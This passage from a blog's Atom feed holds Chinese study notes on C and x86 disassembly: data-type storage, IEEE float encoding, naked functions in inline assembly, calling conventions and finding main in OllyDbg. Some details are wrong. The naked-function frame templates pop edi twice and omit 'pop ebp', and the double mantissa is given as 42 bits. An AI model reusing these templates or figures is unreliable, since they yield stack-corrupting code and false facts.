class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719229837839.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h4 id="感悟-1"><a href="#感悟-1" class="headerlink" title="感悟"></a>感悟</h4><p>每个分支类型都有自己的特征点，记清楚这个后，分析起来会容易很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（四）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（四）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（四）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（四）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（三）</title>
    <link href="https://chumen77.github.io/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://chumen77.github.io/2019/10/20/C语言学习与反汇编（三）/</id>
    <published>2019-10-20T15:45:40.000Z</published>
    <updated>2019-10-23T14:48:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（三）"><a href="#C语言与反汇编学习（三）" class="headerlink" title="C语言与反汇编学习（三）"></a>C语言与反汇编学习（三）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习一下C语言的数据类型与数据存储。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15715865045834.jpg" alt="-w709" title>                </div>                <div class="image-caption">-w709</div>            </figure><h3 id="学习数据类型的三个要素"><a href="#学习数据类型的三个要素" class="headerlink" title="学习数据类型的三个要素"></a>学习数据类型的三个要素</h3><p>1、存储数据的宽度<br>2、存储数据的格式<br>3、作用范围(作用域)<br>这些都是谈起一个数据类型的基本要素。</p><h3 id="整数类型：char-short-int-long"><a href="#整数类型：char-short-int-long" class="headerlink" title="整数类型：char  short  int long"></a>整数类型：char  short  int long</h3><table><thead><tr><th>char</th><th>8BIT</th><th>1字节</th></tr></thead><tbody><tr><td>short</td><td>16BIT</td><td>2字节</td></tr><tr><td>int</td><td>32BIT</td><td>4字节</td></tr><tr><td>long</td><td>32BIT</td><td>4字节</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char i = 0xFF;</span><br><span class="line">short x =0xFF;</span><br><span class="line">long y =0xFF;</span><br></pre></td></tr></table></figure><p>我们来看下在汇编其是什么样的：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15715872059570.jpg" alt="-w505" title>                </div>                <div class="image-caption">-w505</div>            </figure><p>注意<code>byte word dword</code>的区别。<br>然后我们测试一下以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char i = 0x12345678;</span><br><span class="line">short x = 0x12345678;</span><br><span class="line">long y = 0x12345678;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716535773728.jpg" alt="-w639" title>                </div>                <div class="image-caption">-w639</div>            </figure><p>然后看到还是<code>byte word dword</code>，并且也没有报错，但是我们运行以后可以看到</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716536656301.jpg" alt="-w1106" title>                </div>                <div class="image-caption">-w1106</div>            </figure><p><strong>这就说明你写了32位的数给<code>char i</code>这个8位的容器，这是允许的，但是只能装下8位，就从低位开始把78放入。</strong></p><p>整数类型分为有符号(signed)和无符号(unsigned)两种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char i = 0xFF;</span><br><span class="line">unsigned char i = 0xFF;</span><br></pre></td></tr></table></figure><p>要知道其在内存里存着显示的都是FF</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716703064593.jpg" alt="-w178" title>                </div>                <div class="image-caption">-w178</div>            </figure><p>但是输出打印出来一个是255 一个是-1，这就是说明在内存中存储的方式完全一样，但会根据你的定义来确实其是有符号还是无符号。其默认是有符号的，当你想用无符号的时候需要你来定义。并且这个只有在<strong>类型转换和大小比较中特别注意</strong>。因为你直接定义个无符号数，其在内存放的是和原来有符号数一样的，只是你在比较时编译器在编译的时候，<strong>会把其会把汇编代码跳转那里改成特定对应的JCC代码</strong>（只要针对无符号，因为默认是有符号的）。<br>例子：<br>无符号数比较，jcc是JBE，原来没有指定是无符号时，其是JLE（有符号）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716712689830.jpg" alt="-w533" title>                </div>                <div class="image-caption">-w533</div>            </figure><p>总结：1：在内存中存储的方式完全一样 。<br>        2：在类型转换和大小比较中特别注意（运算）。</p><h3 id="浮点类型：float-double"><a href="#浮点类型：float-double" class="headerlink" title="浮点类型：float double"></a>浮点类型：float double</h3><p>float和double在存储方式上都是遵从IEEE的规范的<br>float的存储方式如下图所示：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716717408638.jpg" alt="-w619" title>                </div>                <div class="image-caption">-w619</div>            </figure><p>double的存储方式如下图所示：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716718171405.jpg" alt="-w729" title>                </div>                <div class="image-caption">-w729</div>            </figure><h4 id="将一个float型转化为内存存储格式的步骤为"><a href="#将一个float型转化为内存存储格式的步骤为" class="headerlink" title="将一个float型转化为内存存储格式的步骤为:"></a>将一个float型转化为内存存储格式的步骤为:</h4><ol><li>先将这个实数的绝对值化为二进制格式</li><li>将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有 效数字的右边。</li><li>从小数点右边第一一位开始数出二十三位数字放入第22到第0位。</li><li>如果实数是正的，则在第31位放入“0”，否则放入“1”。</li><li>如果n是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”。</li><li>如果n是左移得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位。</li><li>如果n是右移得到的或n=0，则将n化为二进制后在左边加“0’补足七位，再各位求反，再放入第29到第23位。</li></ol><p>这是官方解释。有点麻烦。先练习一个：<br>8.25转成浮点存储</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716720748599.jpg" alt="-w271" title>                </div>                <div class="image-caption">-w271</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716720864148.jpg" alt="-w229" title>                </div>                <div class="image-caption">-w229</div>            </figure><p>所以8.25用二进制表示可表示为1000.01，科学计数法表示一下：1.00001X2^3<br>小数点向左移动3位 指数为3，然后按照上面先放第一个空格0（因为是正数），接着放最后一个大格子00001（科学计数法表示后从小数点后），然后中间格子第一位1（因为是左移小数点），指数3-1=2变成二进制10从右边开始放入。这就是IEEE规范。(可以感受到最麻烦就是中间这段的确定值)</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716722496131.jpg" alt="-w409" title>                </div>                <div class="image-caption">-w409</div>            </figure><p>按四位分割<code>0100 0001 0000 0100 0000 0000 0000  0000</code>=41040000，然后就这样的形式存入计算机内存。</p><p>我下面用简单的且是正确的办法来转换：<br>将float类型的12.5 转换成16进制：<br>先整理正数部分，12=C=1100<br>小数部分 0.5 * 2=1.0<br>所以二进制就是1100.1，科学计数法 1.1001x2^3<br>这次对中间格子是直接用<code>127+x的结果</code> 变成二进制填充这个格子，x的值就是指数，其中<strong>左移是正右移为负</strong><br> <figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15716732149036.jpg" alt="-w382" title>                </div>                <div class="image-caption">-w382</div>            </figure></p><h4 id="double类型"><a href="#double类型" class="headerlink" title="double类型"></a>double类型</h4><p>前面讲解了单精度浮点类型的IEEE编码。double类型和float类型大同小异，只是double类型表示的范围更大，占用空间更多，是float类型所占用空间的两倍。当然，精准度也会更高。</p><p>double类型占8字节的内存空间，同样，最高位也用于表示符号，指数位占11位，剩<br>余42位用于表示位数。<br>在float中，指数位范围用8位表示，加127后用于判断指数符号。在double中，由于扩大了精度，因此指数范围使用11位正数表示，<strong>加1023后可用于指数符号判断</strong>。</p><p>double类型的IEEE编码转换过程与float 类型一样，可根据float类型的转换流程<br>来转换double类型。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15717429314228.jpg" alt="-w756" title>                </div>                <div class="image-caption">-w756</div>            </figure><h3 id="英文字符存储"><a href="#英文字符存储" class="headerlink" title="英文字符存储"></a>英文字符存储</h3><p>char x = ‘A’;<br>对于一个英文字符，编译器会自动查ASCII表获取其定义的7位二进制数，然后转换存储其16进制放入内存中。例：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15717434285598.jpg" alt="-w446" title>                </div>                <div class="image-caption">-w446</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/20/C语言学习与反汇编（三）/images/15717434479758.jpg" alt="-w420" title>                </div>                <div class="image-caption">-w420</div>            </figure><p>补充：</p><ul><li>标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。</li><li>ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。</li><li>扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。</li></ul><p>为什么不是八位二进制呢？因为其第一位都是0，没必要记录，在起初7位已经满足需求。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（三）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（三）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（三）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（三）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（二）</title>
    <link href="https://chumen77.github.io/2019/10/19/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://chumen77.github.io/2019/10/19/C语言与反汇编学习（二）/</id>
    <published>2019-10-19T15:49:13.000Z</published>
    <updated>2019-10-20T15:06:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（二）"><a href="#C语言与反汇编学习（二）" class="headerlink" title="C语言与反汇编学习（二）"></a>C语言与反汇编学习（二）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习一下c是如何变成汇编的，查找程序入口，调用约定，和主要练习使用__declspec(naked)裸函数实现部分简单的功能和完整的逆一个简单EXE成c语言。</p><h2 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h2><h3 id="什么是裸函数？"><a href="#什么是裸函数？" class="headerlink" title="什么是裸函数？"></a>什么是裸函数？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void __declspec(naked) Function()  </span><br><span class="line">&#123;.....&#125;</span><br></pre></td></tr></table></figure><p>在代码中申明函数后，编译时，除了入口参数压栈外，然后就是call这个函数，编译器不会为函数体生成任何代码。</p><h3 id="运行裸函数为什么会出错"><a href="#运行裸函数为什么会出错" class="headerlink" title="运行裸函数为什么会出错"></a>运行裸函数为什么会出错</h3><p>以上的裸函数运行后，因为编译器除了入口参数压栈外，然后就是call这个函数，不会给其生成任何的汇编代码，所以明显运行后其无法回到原来的主函数，然后堆栈是不平衡的。所以：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void __declspec(naked) Function()  </span><br><span class="line">&#123;</span><br><span class="line">    __asm ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加一个ret就好了，不会再报错了。</p><h3 id="裸函数框架简单集合"><a href="#裸函数框架简单集合" class="headerlink" title="裸函数框架简单集合"></a>裸函数框架简单集合</h3><h4 id="无参数无返回值的函数框架"><a href="#无参数无返回值的函数框架" class="headerlink" title="无参数无返回值的函数框架"></a>无参数无返回值的函数框架</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">void __declspec(naked) Function()  </span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp,esp</span><br><span class="line">        sub esp,0x40</span><br><span class="line">        push ebx</span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        lea edi,dword ptr ds:[ebp-0x40]</span><br><span class="line">        mov eax,0xCCCCCCCC</span><br><span class="line">        mov ecx,0x10</span><br><span class="line">        rep stosd</span><br><span class="line">        pop edi</span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        pop ebx</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="有参数有返回值的函数框架"><a href="#有参数有返回值的函数框架" class="headerlink" title="有参数有返回值的函数框架"></a>有参数有返回值的函数框架</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void __declspec(naked) Function()  </span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp,esp</span><br><span class="line">        sub esp,0x40</span><br><span class="line">        push ebx</span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        lea edi,dword ptr ds:[ebp-0x40]</span><br><span class="line">        mov eax,0xCCCCCCCC</span><br><span class="line">        mov ecx,0x10</span><br><span class="line">        rep stosd</span><br><span class="line">        //主要功能</span><br><span class="line">        mov eax,dword ptr ds:[ebp+8]</span><br><span class="line">        add eax,dword ptr ds:[ebp+0xC]</span><br><span class="line">        </span><br><span class="line">        pop edi</span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        pop ebx</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="带局部变量的函数框架"><a href="#带局部变量的函数框架" class="headerlink" title="带局部变量的函数框架"></a>带局部变量的函数框架</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">void __declspec(naked) Function()  </span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp,esp</span><br><span class="line">        sub esp,0x40</span><br><span class="line">        push ebx</span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        lea edi,dword ptr ds:[ebp-0x40]</span><br><span class="line">        mov eax,0xCCCCCCCC</span><br><span class="line">        mov ecx,0x10</span><br><span class="line">        rep stosd</span><br><span class="line">        //主要功能</span><br><span class="line">        mov dword ptr ds:[ebp-4],2</span><br><span class="line">        mov dword ptr ds:[ebp-8],3</span><br><span class="line">        mov eax,dword ptr ds:[ebp+8]</span><br><span class="line">        add eax,dword ptr ds:[ebp+0xC]</span><br><span class="line">        //注意汇编中局部变量的存放办法    </span><br><span class="line">        pop edi</span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        pop ebx</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        mov esp,ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在练习中发现对局部变量在汇编中如何存放，如何体现有些生疏，特此记录一下。</strong></p><h3 id="针对裸函数的练习"><a href="#针对裸函数的练习" class="headerlink" title="针对裸函数的练习"></a>针对裸函数的练习</h3><p>目标是要实现以下功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int plus(int x,int y,int z)</span><br><span class="line">&#123;</span><br><span class="line">    int a = 2;</span><br><span class="line">    int b = 3;</span><br><span class="line">    int c = 4;</span><br><span class="line">    return x+y+z+a+b+c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">// Day2.cpp : Defines the entry point for the console application.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">int __declspec(naked)  plus(int x,int y,int z)</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x40//开栈</span><br><span class="line">push ebx</span><br><span class="line">push esi</span><br><span class="line">push edi//保护现场</span><br><span class="line">lea edi,dword ptr ds:[ebp-0x40]</span><br><span class="line">mov ecx,0x10</span><br><span class="line">mov eax,0xCCCCCCCC</span><br><span class="line">rep stosd//为缓冲区填充数据</span><br><span class="line">//真正要执行的功能</span><br><span class="line">//局部变量：EBP—4开始 参数：ebp+8开始</span><br><span class="line">//ebp+4是eip 原来call下条语句</span><br><span class="line">mov eax,0x2</span><br><span class="line">mov dword ptr ds:[ebp-0x4],eax</span><br><span class="line">mov eax,0x3</span><br><span class="line">mov dword ptr ds:[ebp-0x8],eax</span><br><span class="line">mov eax,0x4</span><br><span class="line">mov dword ptr ds:[ebp-0x0C],eax  //放入局部变量</span><br><span class="line">mov eax,dword ptr ds:[ebp+0x8]</span><br><span class="line">add eax,dword ptr ds:[ebp+0x0C]</span><br><span class="line">add eax,dword ptr ds:[ebp+0x10]</span><br><span class="line">add eax,dword ptr ds:[ebp-0x4]</span><br><span class="line">add eax,dword ptr ds:[ebp-0x8]</span><br><span class="line">add eax,dword ptr ds:[ebp-0x0C] </span><br><span class="line">mov dword ptr ds:[ebp-0x4],eax//把计算结果放入栈中，下面主函数打印a时要用到</span><br><span class="line">pop edi;</span><br><span class="line">pop esi;</span><br><span class="line">pop ebx;</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">int a;</span><br><span class="line">a=plus(6,7,8);</span><br><span class="line">printf(&quot;%d\n&quot;,a);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习这个可以更加熟悉堆栈结构，参数、局部变量的位置。</p><h2 id="程序真正的入口"><a href="#程序真正的入口" class="headerlink" title="程序真正的入口"></a>程序真正的入口</h2><p>main 或WinMain 是“语法规定的用户入口”，而不是“应用程序入口”。应用程序入口通常是启动函数。</p><p>在OD中默认设置就是到winmain入口就暂停程序，其并不是主函数入口。其实每一种编译器都有自己一套的编译标准，在主函数启动前要做一些必要的准备工作，下面我分析的是vc6.0的。</p><h3 id="main-函数的识别与寻找"><a href="#main-函数的识别与寻找" class="headerlink" title="main 函数的识别与寻找"></a>main 函数的识别与寻找</h3><p><strong>只是vc++6.0</strong><br>main 函数被调用前要先调用的函数如下：</p><ul><li>GetVersion() </li><li>_heap_init() </li><li>GetCommandLineA() </li><li>_crtGetEnvironmentStringsA() </li><li>_setargv()</li><li>_setenvp()</li><li>_cinit()</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715025630158.jpg" alt="-w414" title>                </div>                <div class="image-caption">-w414</div>            </figure><p>这些函数调用结束后就会调用main 函数，根据main 函数调用的特征，将3个参数压入栈内作为函数的参数。<br>所以在winmain停下后，可以一直单步调试，遇到call的时候，注意前方是不是有3个参数被压入栈了，是的话这个可以基本判断它call的就是main函数直接步过进去即可，但是这个也不是一定的，结合智能od的注释，注释有win内核函数调用就不要进入函数就可以了。</p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>常见的几种约定：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715066318478.jpg" alt="-w355" title>                </div>                <div class="image-caption">-w355</div>            </figure><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>使用VC++ (关闭优化选项)编译代码生成cdecl.exe文件后，使用OllyDbg调试:函数的参数1、2以逆序方式压人栈，<br>调用Plus(函数( 401014)后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式即是cdecl。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715038333622.jpg" alt="-w267" title>                </div>                <div class="image-caption">-w267</div>            </figure><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p>stdcall常用于win32 api，在往后的VB中很常见。这个是自身函数内部进行栈清理。若想使用stdcall方式编译源码，只要使用<code>_ stdcall</code>关键字即可。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715038140613.jpg" alt="-w295" title>                </div>                <div class="image-caption">-w295</div>            </figure><p>栈的清理工作由add(函数中最后( 40100F)的RETN 8命令来执行。RETN 8命令的含义为RETN+POP 8字节，即返回后使ESP增加到指定大小。</p><p>像这样在被调用者add)函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于， <strong>被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecI方式相比，代码尺寸要小</strong>。</p><p><strong>虽然Win 32 API是使用C语言编写的库，但它使用的是stdcall方式，而不是C语言默认的cdecl方式。</strong>这是为了获得更好的兼容性，使C语言之外的其他语言( Delphi(Pascal)、Visual Basic等)也能直接调用API。</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>fastcal方式与stdcall方式基本类似，但该方式通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。</p><p>顾名思义，fastcall方式的优势在于可以实现对函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。倘若调用函数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。此外,如果函数本身很复杂，需要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。有舍也有得。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715042971030.jpg" alt="-w292" title>                </div>                <div class="image-caption">-w292</div>            </figure><p>就跟这种情况，一定要注意其是直接用寄存器来传参和计算的，不涉及栈，不过这个不常用。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715043849420.jpg" alt="-w330" title>                </div>                <div class="image-caption">-w330</div>            </figure><p>这个就是常用的情况，传参的时候会把部分的参数用寄存器来传。</p><h2 id="第一次完整逆一个exe（CallingConvention-exe）"><a href="#第一次完整逆一个exe（CallingConvention-exe）" class="headerlink" title="第一次完整逆一个exe（CallingConvention.exe）"></a>第一次完整逆一个exe（CallingConvention.exe）</h2><h3 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715046760959.jpg" alt="-w855" title>                </div>                <div class="image-caption">-w855</div>            </figure><p>简单一看，这个就是停在winmain入口了，注意寻找前面所说的那个找call之前有3个参数压栈最为函数参数的语句，一直单步走：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715049691652.jpg" alt="-w679" title>                </div>                <div class="image-caption">-w679</div>            </figure><p>疑似出现符合的情况，这时候按<code>F7</code>进去查看内部：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715050273427.jpg" alt="-w535" title>                </div>                <div class="image-caption">-w535</div>            </figure><p>简单一看，就是我们要找的main函数。<br><strong>接下来为了加强分析可观性，我把汇编代码都放进了WPS中进行分析</strong>：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715051301041.jpg" alt="-w1307" title>                </div>                <div class="image-caption">-w1307</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715051770389.jpg" alt="-w1311" title>                </div>                <div class="image-caption">-w1311</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/10/19/C语言与反汇编学习（二）/images/15715052426371.jpg" alt="-w1254" title>                </div>                <div class="image-caption">-w1254</div>            </figure><p>（箭头指的不是特别好……）</p><h3 